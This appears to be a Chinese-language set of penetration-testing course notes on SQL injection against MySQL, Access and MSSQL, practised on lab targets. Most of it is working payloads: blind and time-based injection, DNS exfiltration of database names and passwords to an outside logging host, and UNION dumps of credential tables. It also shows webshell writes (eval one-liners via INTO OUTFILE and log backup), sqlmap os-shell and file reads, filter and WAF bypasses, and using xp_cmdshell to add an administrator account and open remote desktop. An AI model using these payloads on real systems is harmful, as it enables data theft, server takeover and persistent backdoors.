9，盲注与回显在我们的注入语句被带入数据库查询但却什么都没有返回的情况我们该怎么办？例如应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。这时，我们之前学习的SQL注入办法就无法使用了。这种情况我们称之为无回显，如果页面有信息显示，我们称之为有回显。回显状态的页面没什么可说的，无回显的这种我们就可以采用盲注的手段 1，Boolian(布尔型)盲注盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。 发现这个注入没有效果了 采用sql语句中and的方法，返回正确或错误来构造，按照之前的思路构造一个SQL拼接: vince’ and extractvalue(0,concat(0x7e,version()))# 输入后根据返回的信息判断之前的思路不再适用。 盲注语句 ## 判断用的数据库的长度vince and length(database())=7# ## 若长度为7则返回数据，如果不是则不会返回数据，这样反复尝试可以直到库名的长度 ## 获取数据库名vince and ascii(substr(database(),1,1)) = 112# ## 判断数据库第一个字母的ascii值是否为112，也就是p,通过不断尝试，可以拿到库名 结果没有报错，说明存在这个注入点，布尔型盲注基本都是通过ascii码来测试的。 select id,username,email from member where username=vince and ascii(substr(database(),1,1))=112# 2，时间型盲注到base on time盲注下，输入上个演示中设置好的payload vince’ and ascii(substr(database(),1,1))112# ，返回的信息发现不存在注入点。那这样就不能进行注入了？当然还要继续尝试，其实可以通过后端的执行时间来进行注入。这里会用到的 payload: vince’ and sleep(x)# , sleep(5)那么你会看到页面等待了5秒钟才出结果，说明有注入点 盲注语句 vince and if(length(database())=7,sleep(5),null)# 判断数据库名长度，条件为真则进行睡眠，否在不会有数据vince and if(substr(database(),1,1)=p,sleep(5),null)#vince and if(ascii(substr(database(),1,1))=112,sleep(5),null)# ## 时间型盲注经常使用的函数： sleep(5) benchmark(10000000,MD5(1)) ## benchmark是mysql的内置函数，是将MD5(1)执行10000000次以达到延迟的效果 如果sleep被防御了，可以使用benchmark。 10,dnslogdnslog注入也可以称之为dns带外查询，Dns在域名解析时会在DNS服务器上留下域名和解析ip的记录，可以在dns服务器上查询相应的dns解析记录，来获取我们想要的数据。 大致原理： 具备DNSlog日志记录功能的网站A我们不用自己搭建，可以采用如下三个，当然如果你想自己搭建也是可以的： http://ceye.io/ 知道创宇公司提供的http://www.dnslog.cn/http://admin.dnslog.link #最近发现，这个好像不太好用了 条件： 1、需要mysql用户具备读文件的权限，因为要借助到mysql的load_file读取文件的函数，权限不够的话，不能调用这个函数。其实只要mysql中配置项中开启了这个secure_file_priv配置，就可以通过sql语句来执行文件读写操作。 2、目标mysql数据库服务器能够访问外网,其实load_file()不仅能够加载本地文件，同时也能对诸如 [www.jaden.com](http://www.jaden.com) 这样的URL发起请求。这样的url我们称之为UNC路径，简单了解即可。就借助load_file函数能够访问某个网址的特性，来进行DNSlog注入，注入语句如下 select load_file(\\\\\\\\xxx.xxxx.xxx\\\\xx);#xxx.xxxx.xxx\\\\xx是某个网址 执行流程如下，这个简单看一下即可 第一步：先看一下网址域名 9fqiop.ceye.io 第二步：将网址添加到sql语句中 select load_file(\\\\\\\\9fqiop.ceye.io\\\\abc); 第三步：开启MySQL的读取文件功能的配置项 第四步：在mysql命令行先执行一下我们的写好的sql语句 第五步：看一下日志记录 发现，有记录了，并且看到了pp这个数据，那么我们就可以继续构造获取敏感数据的sql语句了 select load_file(concat(//,(select database()),.9fqiop.ceye.io/abc)) #获取库名 第六步：开始注入 下面两个都可以： 1，获取库名select * from member where id=1 and (select load_file(concat(//,(select database()),.9fqiop.ceye.io/abc)))select * from member where id=1 and (select load_file(concat(\\\\\\\\,(select database()),.9fqiop.ceye.io\\\\abc))) pikachu网站测试：抓包，添加注入语句 查看DNS记录 成功通过dns记录，带出了当前数据库的名称pikachu 2，获取表名and (select load_file(concat(\\\\\\\\,(select table_name from information_schema.tables where table_schema=database() limit 0,1),.e06o0h.ceye.io\\\\abc)))and (select load_file(concat(\\\\\\\\,(select table_name from information_schema.tables where table_schema=database() limit 1,1),.e06o0h.ceye.io\\\\abc)))and (select load_file(concat(\\\\\\\\,(select table_name from information_schema.tables where table_schema=database() limit 2,1),.e06o0h.ceye.io\\\\abc)))## 修改limit后面的数字即可将每个表名都查出来 3，查询字段名and (select load_file(concat(\\\\\\\\,(select column_name from information_schema.columns where table_schema=database() and table_name=member limit 0,1),.9fqiop.ceye.io\\\\abc)))## 同样也是修改limit后面的数字，将member表的字段名一个一个的取出来 4，获取数据查询一下member的username和pw字段的数据 and (select load_file(concat(\\\\\\\\,(select username from member limit 0,1),.9fqiop.ceye.io\\\\abc)))and (select load_file(concat(\\\\\\\\,(select pw from member limit 0,1),.9fqiop.ceye.io\\\\abc))) payload总结k and updatexml(1,concat(~,(SELECT @@version),~,~,(SELECT user())),1) #k and extractvalue(11,concat(~,(SELECT @@version),~,~,(SELECT user())))#k and extractvalue(11,concat(~,(SELECT @@version),~,~,(SELECT database())))#kand updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 1)),0)#kand updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema=pikachu)),0)#k and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=users and table_schema=pikachu limit2,1)),0)#k and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#jadenor updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 0,1)),0) or or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=userslimit 2,1)),0) or or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or 等同于 or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or 1=1 3,mysql变量和函数mysql show global variables;# select @@version_compile_os; 4，sqlmap 1,注入获取数据的相关参数--dbs： ## 会获取所有的数据库 //默认情况下sqlmap会自动的探测web应用后端的数据库类型：MySQL、Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAPMaxDB、DB2--current-user： ## 大多数数据库中可检测到数据库管理系统当前用户--current-db：## 当前连接数据库名--is-dba：## 判断当前的用户是否为管理--users：## 列出数据库所有所有用户 -tables 获取表名 指令： --tables -D 数据库名## -D是指定某个数据库，如果不加-D参数，那么会将所有数据库的所有表获取出来，最好指定数据库名，这样精准快速一些。 –columns获取字段名 指令： -T user -C username,password,email --dump 读文件内容 指令： --file-read /etc/password 系统交互的shel 指令： --os-shell 写webshell 指令： --file-write c:/2.txt” --file-dest “C:/php/htdocs/sql.php” -v 1--file-write c:/2.txt” --file-dest “C:\\phpStudy\\PHPTutorial\\WWW\\xx.php” -v 1 查询https网站–force-ssl sqlmap -u https://192.168.18.26:82/sqlserver/1.aspx?xxser=1 --force-ssl -proxy使用代理连接 sqlmap -u http://192.168.18.26:82/sqlserver/1.aspx?xxser=1 -proxy http://192.168.18.100:82## 快代理：sqlmap -u http://192.168.18.26:82/sqlserver/1.aspx?xxser=1 -proxy http://183.21.81.188:41825 –proxy-file使用文件中的代理地址连接 vim 1.txt## 文件内容如下： http://192.168.18.100:82 http://192.168.18.101:82 http://192.168.18.102:82 http://192.168.18.103:82 ## 指令： sqlmap -u http://192.168.18.26:82/sqlserver/1.aspx?xxser=1 -proxy-file 1.txt ## 代理ip我们可以去一些免费的网站找，比如：西祠代理和快代理 5,后端代码防御绕过?php$uname = $_GET(username);## 情况一：判断关键字 if (select in $uname) echo 不要搞事情 ## 情况二：替换关键字 将select * from users中的select替换为空字符串 echo str_replace(select,,select * from users);## 情况三：直接将用户提交的id数据转换为整型 $id = $_POST(id); $id_int = intval($id); select * from users where id=$id_int## 情况四：魔术符号，将用户提交的数据中的引号自动在前面加上\\进行转义 ## magic_quotes_gpc=on ## 或者使用了addslashes($id)...? 我们拿这么几种防御手法来举例 情况一绕过：大小写绕过：SELECT * FROM USERS； 情况二绕过：双写：selselectect * from users; 其实str_replace只替换了一次select还剩下一个select 情况三：强防御，这种的很难绕过了，因为我们写的注入语句都是字符串，针对提交数据为纯数字的时候，这种防御就很难绕过了，但是好多时候，用户正常向后台提交的数据都是非数字类型的，这样的话就不会进行intval()的加工，就可以尝试其他注入手法。 情况四：开启了魔术符号转义功能，这种的参看我们前面说的宽字节注入、二次注入等，其他办法很难绕过，但是这里有个点，就是如果对id1这种数字型的注入，还是有其他办法的，比如id1 and select * from users;这样的注入语句没有单引号。 还有很多其他的防御手法，就需要积累经验了，后面学习到waf(web应用防火墙)的时候，会学习很多waf绕过的手法，其中好多和后台代码绕过的手法一样，所以后台代码绕过就先说这么多，等学到waf绕过的时候，我们再多学习。 6，SQL注入读取文件和数据库数据1，读取文件数据前提条件 ## 1、通过信息收集获取到想要读取的目标文件的真实物理路径## 2、mysql开启了secure_file_priv这个配置 然后重启mysql即可。 读取文件的的SQL语句 借助mysql自带的功能函数load_file 测试union联合查询语句 使用union需要注意后面查询语句中的字段个数，要和前面的个数相同 测试注入 效果 2，注入语句vince union select 1,load_file(C:\\\\tools\\\\phpstudy\\\\PHPTutorial\\\\1.txt)# 2，读取数据库数据1，判断查询的字段个数 order by 1,2,3--+ #报错，表示字段个数小于3个，那么减少一个字段来尝试 order by 1,2--+ #不报错，表示字段个数为2个，如果还报错，那么继续减少一个来尝试 order by 1,2# order by 1,2,3# 效果 表示，这个字符型注入的查询，后台select语句后面查询的是2个字段数据，那么我们就知道，通过union联合查询的时候，查询的数据是2个字段数据了。 2，查询当前数据库名、用户名、版本等信息 union select user(),version()--+ 3，获取mysq所有库名 union select 1,group_concat(schema_name) from information_schema.schemata+--+ ## 浏览器地址栏要URL编码，表单直接#或者 -- 就可以union select 1,group_concat(schema_name) from information_schema.schemata## -- mysql的注释符号 4，获取pikachu库的所有表名 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+ union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()# 5，获取表中的字段名 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273+--+ union select 1,group_concat(column_name) from information_schema.columns where table_name=member+--+ 6, 获取所有字段数据 union select 1,group_concat(id,0x7c,username,0x7c,password,0x7c,level,0x7c) from users+--+ ## 其中0x7c表示|，我这里就是为了通过|来拼接每个数据。group_concat类似于concat，也是做字符串拼接的，是MySQL的一个内置函数 3,getshell1，木马利用试验就用我们之前的环境吧，就是部署了pikachu站点的那个虚拟机。 址访问一下这个文件，没有报错，表示文件可以通过网址正常访问到。 2，一句话木马利用程序## 菜刀、蚁剑、冰蝎、哥斯拉四大木马利用神器，现在推荐冰蝎和蚁剑，功能更好一些，关于这些工具的介绍和使用我在木马课程中有专门的讲解，包含他们自己的特征信息、流量数据特征分析、工具原理和配置等，在这里就不多提了。下面使用的蚁剑就在我给大家win10虚拟机上放的vstart工具文件夹中： 3，通过注入点写入木马程序的前提条件1. mysql开启了secure_file_priv=的配置2. 要知道网站代码的真实物理路径3. 物理路径具备写入权限4. 最好是mysql的root用户，这个条件非必须，但是有最好 4，通过注入点写入木马程序 union select ?php @xx($_POST[jaden]);?,2 into outfile C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\jaden.php+--+ union select ?php @eval($_POST[aini]);?,2 into outfile C:\\\\tools\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\aini.php -- ## xx表示eval，因为直接写eval，我们的这个md文档会被杀软杀掉的。 5，通过sql语句写入文件测试 ok，sql语句没有问题，开始注入，先删掉jaden.php吧。目标服务器中可以看到，是没有jaden.php文件的。 6，工具利用连接 ## 1.木马上传成功了## 2.知道木马的路径在哪里## 3.上传的木马能够正常运行 7，获得后台真实物理路径的方法## 1、收集站点敏感目录，比如phpinfo.php探针文件是否可以访问到## 2、站点网址输入一些不存在的网址或者加一些非法参数数据，让网站报错，看错误信息中是否存在路径信息3、指纹信息收集 ## nginx默认站点目录： /usr/share/nginx/html，配置文件路径：/etc/nginx/nginx.conf ## apache默认站点目录：/var/www/html ...## 4、通过站点其他漏洞来获取配置信息、真实物理路径信息，比如如果发现远程命令执行漏洞(后面会讲到各种其他漏洞)，针对php的站点，直接执行一个phpinfo()函数，可以看到phpinfo.php所展示的各种信息等等。## 5、其他思路，反正就是不断的尝试。 7，accesss数据库SQL注入 7-1 猜数据库表名http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from users) ## mysql5.0以前版本都是靠暴力猜解，准备个字典(表名、库名、字段名等)## exists：access数据查询结果是否有数据，如果有数据，exists得到true，真## 如果没有数据，直接给你报错了 ## 返回错误信息，说明users表不存在，继续提交。exists是判断某个表是否存在或者表中是否有数据。## 报错了说明没有这个users表 查看是否有news表，我们这是手工根据经验尝试表名，后面有字典爆破工具昂。 http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from news) 没有报错，说明有news表 查看是否有管理员表，名称一般为admin或者administrator http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from admin) 还是返回错误信息，说明admin表不存在，继续提交。 http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from administrator) 吴老板返回正常页面，说明存在administrator表(图8 存在administrator表与不存在的表对比) 7-2 猜测字段名http://192.168.1.55:901/news_view.asp?id=14 and exists(select username from administrator)http://192.168.1.55:901/news_view.asp?id=14 and exists(select user_name from administrator)http://192.168.1.55:901/news_view.asp?id=14 and exists(select password from administrator) 7-3 猜测字段数据的长度http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)1select top 1 len(user_name) from administrator #取出administrator表的前1行记录，并查询这行记录的user_name字段的长度http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)2http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)5 7-4 猜字段数据内容http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)0 ## 返回正常页面## 说明ASCII值大于0 ,字段值应该为字母，如果是小于0那么说明是汉字，下面我们继续猜解。 ## mid是从中间位置取子串函数## 格式如下：## mid（字符串，起始位，截取的位数）## 例如：## mid（“abcdef”，2，3）## 结果是bcd## asc是查看字母在ascii码表中的代表数字，ASCII值大于0 ,字段值应该为字母，如果是小于0那么说明是汉字，因为ascii码表中没有汉字，返回负数 http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)500 ## 返回错误页面## 说明字段对应的ASCll值在0和500之间。继续提交。http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)100 ##返回错误页面## 说明字段对应的ASCll值在0和100之间。继续提交。http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)90 ## 返回正常页面## 说明字段对应的ASCll值在90和100之间。继续提交。http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)96 ## 返回正常页面## 说明字段对应的ASCll值在96和100之间。继续提交。http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)97 ## 返回错误页面## 说明administrator表中的user_name字段的第一位ASCII值为97。通过反查ASCII值对应的字母，得到字符值为“a”，接着第二位查询。http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,2,1)) from administrator)99 ## 返回正常页面(注：查第二个字母的时候记得把user_name后面的1变成2)http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,2,1)) from administrator)100 ## 返回错误页面## 用同样的方法，可猜解user_name字段值和password值,最终得到如下结果:## 可看出password的值为32位MD5加密，使用MD5在线破解工具进行破解，得到明文密码为admin[user_name]:admin[password]:21232f297a57a5a743894a0e4a801fc3 得到管理员用户名和密码后，登录后台:http://192.168.1.55:901/admin/index.asp，输入猜解出来的用户名和密码.就可以成功进入网站后台页面。 7-5 高级查询——order by 与union select5-1 order-by 猜字段是数目order by 1order by 2...order by n-1order by n 如果n-1时返回正常，n时返回错误，那么说明字段数目为n。 5-2 union select爆字段内容## 得到字段长度后，就可利用union select查询获得字段内容了。and 1=2 union select 1, 2, 3...., n from 表名## 执行上面的查询时，在页面中会返回数字，修改查询语句中的数字为字段名，例如提交如下代码。and 1=2 union select1, 字段1, 字段2...., n from 表名## 在页面中就会返回字段内容，不必一个一个进行猜解了 测试实例 http://192.168.1.55:901/news_view.asp?id=14 order by 1 ## 正常http://192.168.1.55:901/news_view.asp?id=14 order by 7 ##正常http://192.168.1.55:901/news_view.asp?id=14 order by 8 ## 错误 ## 说明字段数目为7 ，因此可提交以下字段。http://192.168.1.55:901/news_view.asp?id=14 union select 1,2,3,4,5,6,7 from administrator ## (通过联合查询从这7个字段里面去查询administrator表里面那些是可写的数字) ## 从页面返回信息中，可看到显示了数字2和3。因此可以将这2个数字替换为我们想要数据的字段名，提交如下查询。http://192.168.1.55:901/news_view.asp?id=14 union select 1,user_name,password,4,5,6,7 from administrator## 在页面返回信息中，立即获得了user_name和password字段的值，比前面的方法快速高效多了。 有了后台用户名和密码，那么我们再找到后台登录网址就可以了 使用7kb或者御剑等攻击来扫描目录 登录就可以修改里面的数据，或者插入一些木马在里面了 8，mssql注入 8-1 sqlserver 三个权限级别首先知道一下mssql的权限：sa、dbowner、public三大权限，sa是最高权限(类似于windows的system、linux的root权限) ## sa权限：数据库操作，文件管理，命令执行，注册表读取等，高权限## db权限：文件管理，数据库操作等## public权限：数据库操作等 Mssql的默认端口号为1433，oracle是1521，mysql是3306，在windows下通过 netstat -an -p tcp -o 指令就能看到，并且可以查看到对应的进程pid，在通过任务管理器中的pid可以看到进程是谁。mssql默认是可以远程连接的，mysql需要授权才能远程连接。 8-2 查询函数db_name() ## 数据库名@@version ## 版本信息User_name() ## 当前用户host_name() ## 计算机名称 8-3 注释符--空格 ## 单行注释/**/ ## 多行注释 8-4 判断注入 单引号 是否报错and 1=1 and 1=2 页面是否相同 8-5 判断列数order by 8-6 联合注入sqlserver对数据类型比较严谨 union select 1,2,3 ## 表明，数据类型不全是int型，逐步调试## 一般来说列都是id，对应的就是int型union select 1,2,3union select 1,2,3 也可以通过 null 来查看 8-7 查询数据union select 1,username,password from admin 如果字段或者表名不存在，则会报错 8-8 报错注入8-1 查询系统信息and @@version 1and user_name() 1and db_name() 1 @@version是字符串，0是整数型；利用mssql在转换类型的时候出错，会提示信息 8-2 爆库and (select top 1 name from master..sysdatabases) 0## 查询所有数据库名中的个 ## 询所有数据库名，除了masterand (select top 1 name from master..sysdatabases where name not in (master)) 0##查询所有数据库名，除了master,iNethinkCMSand (select top 1 name from master..sysdatabases where name not in (master,iNethinkCMS)) 0 8-3 爆表## 查询指定库中的表名的个and (select top 1 name from master.sys.all_objects where type=u and is_ms_shipped=0) 0and (select top 1 name from MYDB.sys.all_objects where type=U AND is_ms_shipped=0 and name not in (cmd,test_tmp)) 0 8-4 爆裂## 查询指定库指定表中的列名and (select top 1 column_name from mydb.information_schema.columns where table_name=admin) 0 8-5 爆数据## 爆用户名and (select top 1 username from admin) 1## 如果再也没有可爆的用户名，页面会显示正常and (select top 1 username from admin where username not in (admin)) 1 9，mssql权限说明和操作9-1 注入点类型判断首先，判断是否是MsSQL注入点，也就是先判断一下网站的数据库是不是mssql数据库，可提交如下查询. and exists (select * from sysobjects) ## select * from admin where id=1 and exists (select * from sysobjects) sysobjects是一个mssql自带的系统表 # 注入：比如 http://192.168.169.200/sqlserver/1.aspx?xxser=1 and exists (select * from sysobjects)## 页面返回正常，则说明为MsSQL注入点。## 一般aspx多数是配合mssql数据库的。 9-2 查询当前数据库系统的用户名and system_user=0 ## 报错以后把用户名爆出来了# http://192.168.1.55/sqlserver/1.aspx?xxser=1 and system_user=0 9-3 设置权限用户1、用Windows 身份验证方式或 sa用户 连接服务器，打开安全性 → 右击登录名 → 新建登录名 2、常规设置： ## 1、输入账户名，密码## 2、去掉密码策略的勾## 3、根据需要选择默认数据库，默认语言 3、服务器角色 根据需要授予角色权限，默认勾选 Public，一般够用了。 4、用户映射 ## 勾选映射的数据库，即该用户可以访问的数据库，这边实际上就是一个对数据库访问权限的控制## 勾选数据库角色成员身份，这边实际上就是一个对数据库操作权限的控制 ## db_datereader:只读的权限 ## db_datawirter:只写的权限 ## db_owner: 数据库拥有者权限，增删改查备份等都可以做 ## public权限：默认权限，增删改查都可以，如果想让用户只读，那么就再勾选上db_datereader角色 5、安全对象、状态 默认即可，可以不设置。如有特殊需要再去设置。 接下来就可以新建数据库，然后新建用户、分配权限进行操作了。 10， 三大权限注入10-1 sa权限注入1-1 检查是否是sa权限如果返回的是sa，那么可以直接判断出用户的权限，但是这里只有提交如下链接查询的权限 http://192.168.1.55/sqlserver/1.aspx?xxser=1 and 1=(select IS_SRVROLEMEMBER(sysadmin)) ## 具备sa权限则返回1，不具备则返回0，所以可以1= 或者0= 来逻辑判断 但是这个语句有点问题，我们先忽略他吧，因为不管输入的名称是不是sysadmin，都不会报错。 1-2 判断一下xp_cmdshell存储过程是否存在xp_cmdshell是mssql数据库的扩展存储功能，这个功能可以直接执行操作系统的指令(ipconfig、pwd等等)，默认情况下这个功能是禁用状态的，所以我们先要看看是否开启了，但我们需要打开的时候，我们可以自行打开，但是这个功能只能是sa这样的权限用户才能开启，dbowner、public等权限都是不能开启的，好，检查一下是否开启了： http://192.168.1.55/sqlserver/1.aspx?xxser=1 and 1=(select count(*) from master.dbo.sysobjects where name =xp_cmdshell) 效果入下 返回正常页面，说明扩展存储存在。 如果发现报错了，说明扩展没有开启，那么我们需要恢复一下或者说打开一下这个功能，如下操作 1-3 恢复xp_cmdshell## 恢复xp_cmdshell可以用 EXEC sp_configure show advanced options, 1;RECONFIGURE;EXEC sp_configure xp_cmdshell, 1;RECONFIGURE;-- 开启了xp_cmdshell，我们接下来就可以添加用户等操作了。 1-4 添加账号现在操作系统中删除之前的test用户 ## 注入指令： ;exec master..xp_cmdshell net user jaden 123456 /add## 比如： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1;exec%20master..xp_cmdshell%20%27net%20user%20test%20test%20/add 去操作系统中查看一下test用户是否创建成功了，发现已经创建成功 1-5 将账号添加到管理员组;exec master..xp_cmdshell net localgroup administrators aini /add 效果： ·1-6 开3389远程连接端口既然已经是管理员组的用户了，那么别人想远程控制你的电脑，那么他就可以开启3389端口，默认远程桌面是关闭的。下面的是通过cmd指令修改注册表的一个选项来开启3389 ;exec master.dbo.xp_regwriteHKEY_LOCAL_MACHINE,SYSTEM\\CurrentControlSet\\Control\\Terminal Server,fDenyTSConnections,REG_DWORD,0; 效果： 开启了 然后，比如通过我们物理机，我的物理机是win10，来远程连接一下win2003的虚拟机，win10上使用快捷键【win】【R】，输入【mstsc】调出远程桌面界面。 登录成功 那这样的话，就可以搞事情了。所以，如果你是运维人员，千万不要启动sa账号，因为可以直接执行系统指令，你看我们数据库这里，肯定是启用了的 10-2 dbowner权限注入2-1 查看当前网站是否为db_owner权限## 注入指令: and 1=(SELECT IS_MEMBER(db_owner));-- ## 有权限就是1，没有就是0## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20and%201=(SELECT%20IS_MEMBER(%27db_owner%27));-- 接下来，我们需要找到网站路径，就是下面这个： C:\\www\\iisaspx\\sqlserver 2-2 查找代码路径2-1 网页报错1.通过报错或者baidu、google等查找，不过还是通过扫描工具来的快一些。 2-2 搜索baidu或者google等，通过site:xxx.com等来查找，看看有没有什么报错的页面或者敏感网页路径信息之类的 2-3 扫描工具我们用过的7kb、 穿山甲什么的。 2.通过相关语句查找，但是也需要一个条件，需要对方开启了xp_cmdshell 1. ;drop table black;create Table black(result varchar(7996) null, id int not null identity (1,1))-- # black是随便写的一个库名昂，只要别和人家网站现有的库重名就行，我经常用这个black名字，所以我先执行了一下删除black表，然后再创建的black表2. ;insert into black exec master..xp_cmdshell dir /s c:\\1.aspx-- # 往black表中插入dir /s c:\\1.aspx这个系统指令的执行结果3. and (select result from black where id=4)0-- # 查找black表中的数据 2.1 创建black表 ## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20drop%20table%20black;create%20Table%20black(result%20varchar(7996)%20null,%20id%20int%20not%20null%20identity%20(1,1))-- 看数据库中是否创建了black表 点击设计，能看到表结构 说明表创建好了。 2.2 插入数据 先查看一下1.aspx文件所在目录，看一下这个指令的执行效果： dir s c:\\1.aspx ## 注入网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20insert%20into%20black%20exec%20master..xp_cmdshell%20%27dir%20/s%20c:\\1.aspx%27-- 效果： 查看表中的数据： 数据库中有数据了，接下来通过注入的方式来获取路径，还是通过报错信息来查看 ## 注入指令： and (select result from black where id=4)0--## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20and%20(select%20result%20from%20black%20where%20id=4)%3E0--## 但是要注意：用低版本的浏览器，不然报错信息看不到路径的 看到了路径，得到路径之后，我们就可以搞事情了，比如上传个木马脚本什么的 2-3 一句话木马拿到webshell通过注入语句来搞：比较麻烦一些 master..xp_cmd %20;exec%20master..xp_cmdshell%20Echo%20%eval%20request(jaden)%%20%20c:\\www\\wwwroot\\sqlserver\\muma.asp-- 差异备份 ;alter database testdb set RECOVERY FULL;create table test_tmp(str image);backup log testdb to disk=c:\\test1 with init;insert into test_tmp(str) values(0x3C2565786375746528726571756573742822636D64222929253E);backup log testdb todisk=c:\\www\\iisaspx\\yjh.asp;alter database testdb set RECOVERY simple 通过工具来搞：比较简单一些 先找到菜刀，将菜刀中的一句话木马拿出来 文件内容如下 我将代码放到下面了： %@ Page Language=Jscript%%eval(Request.Item[123],unsafe);% #注意：我将Item中的chopper改为了123，这是个密码 好，然后打开GetWebShell工具，其中备份路径的这个文件是数据库数据和木马程序，都写在这个文件中了。 回到靶机win2003电脑上，查看目录下的文件，777.aspx就有了 打开这个文件，搜索123，能够看到我们的木马已经写入到这个文件里面了 接下来，我们打开菜刀工具，将777.aspx网址添加到菜刀中 点击添加后，弹出如下窗口 如下，这里不对，出现错误了。 之前在真实环境下使用的时候，是没问题的，这里这个木马程序好像没有连接上，我们换一个木马程序再试试 getwebshell： 靶机上文件有了 再通过菜刀来执行这个木马 .\\typora-user-images 但是还是报错了，这个是我们虚拟机靶机的问题，因为上传一句木马的流程是ok的。 接下来我们看getwebshell工具，它还能通过注入点，添加用户，开机自动添加，这里需要这个网址中的1.aspx文件的权限为管理员权限才行。 看靶机效果： 下载并执行木马，开启自动启动木马程序，这个我们就不玩了。 还可以留后门：这个我们也不玩了 10-3 public权限注入通过这种权限登录的用户是拿不到webshell和系统执行指令权限的，属于最低权限，但是可以取到数据库的用户名和密码，拖库什么的都可以，只要发现注入点，基本都可以拖库，但是能不能拿到操作系统权限，这个要看当前数据库用户的权限了。 3-1 获取当前数据库名## 指令： and db_name()=0--## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20and%20db_name()=0-- 3-2 获取mssql所有数据库名库名 and 1=(select db_name()) --+and 1=(select db_name(1)) --+and 1=(select db_name(2)) --+ 3-3 获取当前数据库所有表名select top 1 name from 当前数据库.sys.all_objects where type=U AND is_ms_shipped=0 and name not in (select top i name from 当前数据库.sys.all_objects where type=U AND is_ms_shipped=0) ## 修改i的值来查看## 比如： and (select top 1 name from testdb.sys.all_objects where type=U AND is_ms_shipped=0 and name not in (select top 0 name from testdb.sys.all_objects where type=U AND is_ms_shipped=0))0 3-4 获取表名和字段名## 第一个指令： having 1=1--## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20having%201=1-- 效果：表名和id字段名 ## 将第一个指令的结果带入到下一个指令## 第二个指令： group by admin.id having 1=1--## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20group%20by%20admin.id%20having%201=1--## 效果：name字段名也看到了 ## 第三个指令： group by admin.id,admin.name having 1=1--## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20group%20by%20admin.id,admin.name%20having%201=1--## 效果：密码字段名也看到了 如此往复就能看到所有admin表中的字段。 3-5 获取字段内容## 指令： /**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char (32))%2bchar(94)%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))%3E0/**/and/**/1=1## 这个指令比较复杂一些，其中/**/没有什么特殊的含义，就和一个空格似的，像一个干扰符号，早期是为了通过waf用的，把这个语句里面的库名、表名、字段名替换成你自己发现的就行了## 网址： http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20/**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))%3E0/**/and/**/1=1 还是发现，手工来写注入语句，太繁琐了，通过工具跑，简单一些，比如穿山甲、sqlmap等,看一下穿山甲的效果：不过有时候可能跑不出来昂，工具就这样。 11,mysql版本区别## mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，叫做：information_schema，## mysql5.0以下没有information_schema库，只能通过暴力猜解的方式来获取数据，information_schema库里面包含了很多表，其中这几张表：schemata、tables、columns，这三张表依次分别存放着字段：(schema_name-库名)、(table_name-表名、table_schema-库名)、(table_schema-库名、table_name-表名、column_name-字段名)，其次就是5.0以上都是多用户多操作，5.0以下是多用户单操作。## mysql5.7和mysql8的区别： 先作为了解。## 创建用户和授权： ## mysql5.7可以一句话搞定： grant all privileges on *.* user@% 